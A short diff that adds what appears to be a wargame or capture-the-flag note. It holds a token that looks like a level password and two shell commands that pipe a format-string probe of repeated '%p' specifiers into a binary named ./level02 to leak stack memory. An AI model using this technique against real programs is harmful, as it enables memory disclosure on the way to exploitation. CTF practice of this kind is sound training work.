@@ -1,0 +1,5 @@
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+
+python -c 'print "%p "*100' > /tmp/exploit
+cat /tmp/exploit - | ./level02
